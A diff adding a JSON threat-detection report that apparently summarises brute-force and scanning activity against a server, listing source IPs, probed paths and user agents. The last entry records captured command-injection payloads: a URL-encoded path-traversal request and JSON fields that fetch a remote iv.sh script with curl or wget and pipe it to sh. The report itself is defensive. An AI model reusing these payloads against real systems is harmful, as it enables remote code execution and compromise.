@@ -1,0 +1,102 @@
+{
+	"metadata": {
+		"source": "standard_log",
+		"destination": {
+			"destination": {
+				"id": "threat_detection",
+				"name": "database",
+				"database": {
+					"name": "results.db",
+					"table": "attack_types"
+				}
+			}
+		},
+		"method": "POST"
+	},
+	"data": [
+		{
+			"Description": "Potential brute force login detected",
+			"Source": "167.94.145.97",
+			"Count": 3,
+			"Severity": "Low",
+			"Threshold": "3 failed attempts, 21 seconds",
+			"FirstTimestamp": "2024-04-20 00:55:06",
+			"LastTimestamp": "2024-04-20 00:55:27",
+			"Status": "Should investigate",
+			"Recommendation": "Investigate the source IP for further suspicious activities. Consider permanent account lockout or password reset protocols if necessary.",
+			"RequestPath": "PRI * HTTP/2.0",
+			"UserAgent": " ||| Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)",
+			"Payload": "No payloads"
+		},
+		{
+			"Description": "Brute force login detected",
+			"Source": "83.97.73.245",
+			"Count": 66,
+			"Severity": "OH MY GOD, GOD DANM, I THINK WE SHOULD BLOCK THIS GUY!",
+			"Threshold": "66 failed attempts, 21 days, 16 hours, 49 minutes, 4 seconds",
+			"FirstTimestamp": "2024-04-04 16:08:05",
+			"LastTimestamp": "2024-04-26 08:57:09",
+			"Status": "Should investigate",
+			"Recommendation": "Investigate the source IP for further suspicious activities. Consider permanent account lockout or password reset protocols if necessary.",
+			"RequestPath": "GET /actuator/gateway/routes HTTP/1.1",
+			"UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
+			"Payload": "No payloads"
+		},
+		{
+			"Description": "Brute force login detected",
+			"Source": "207.154.250.186",
+			"Count": 4,
+			"Severity": "Middle",
+			"Threshold": "4 failed attempts, 9 days, 17 hours, 12 minutes, 48 seconds",
+			"FirstTimestamp": "2024-04-16 17:46:21",
+			"LastTimestamp": "2024-04-26 10:59:09",
+			"Status": "Should investigate",
+			"Recommendation": "Investigate the source IP for further suspicious activities. Consider permanent account lockout or password reset protocols if necessary.",
+			"RequestPath": "GET /solr/admin/cores?action=STATUS\u0026wt=json HTTP/1.1",
+			"UserAgent": "Go-http-client/1.1",
+			"Payload": "No payloads"
+		},
+		{
+			"Description": "Brute force login detected",
+			"Source": "118.194.236.118",
+			"Count": 4,
+			"Severity": "Middle",
+			"Threshold": "4 failed attempts, 4 days, 15 minutes, 39 seconds",
+			"FirstTimestamp": "2024-04-17 09:43:06",
+			"LastTimestamp": "2024-04-21 09:58:45",
+			"Status": "Should investigate",
+			"Recommendation": "Investigate the source IP for further suspicious activities. Consider permanent account lockout or password reset protocols if necessary.",
+			"RequestPath": "GET / HTTP/1.1",
+			"UserAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0 ||| Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
+			"Payload": "No payloads"
+		},
+		{
+			"Description": "Brute force login detected",
+			"Source": "91.92.250.127",
+			"Count": 4,
+			"Severity": "Middle",
+			"Threshold": "4 failed attempts, 5 days, 17 hours, 35 minutes, 52 seconds",
+			"FirstTimestamp": "2024-04-19 16:53:40",
+			"LastTimestamp": "2024-04-25 10:29:32",
+			"Status": "Should investigate",
+			"Recommendation": "Investigate the source IP for further suspicious activities. Consider permanent account lockout or password reset protocols if necessary.",
+			"RequestPath": "GET /.git/config HTTP/1.1",
+			"UserAgent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
+			"Payload": "No payloads"
+		},
+		{
+			"Description": "Brute force login detected",
+			"Source": "92.118.39.120",
+			"Count": 15,
+			"Severity": "High",
+			"Threshold": "15 failed attempts, 7 days, 9 hours, 14 minutes, 42 seconds",
+			"FirstTimestamp": "2024-04-17 20:20:55",
+			"LastTimestamp": "2024-04-25 05:35:37",
+			"Status": "Should investigate",
+			"Recommendation": "Investigate the source IP for further suspicious activities. Consider permanent account lockout or password reset protocols if necessary.",
+			"RequestPath": "GET /api/v1/totp/user-backup-code/../../license/keys-status/%3b%63%75%72%6c%20%68%74%74%70%3a%2f%2f%39%34%2e%31%35%36%2e%37%39%2e%36%30%2f%69%76%2e%73%68%20%7c%20%73%68%20%7c%7c%20%77%67%65%74%20%2d%4f%2d%20%68%74%74%70%3a%2f%2f%39%34%2e%31%35%36%2e%37%39%2e%36%30%2f%69%76%2e%73%68%20%7c%20%73%68%3b HTTP/1.1",
+			"UserAgent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) Gecko/20100101 Firefox/122.0",
+			"Payload": "{\"type\": \";curl http://193.222.96.163/iv.sh | sh || wget -O- http://193.222.96.163/iv.sh | sh #\"} ||| {\"type\": \";curl http://94.156.79.60/iv.sh | sh || wget -O- http://94.156.79.60/iv.sh | sh #\"}"
+		}
+	]
+}
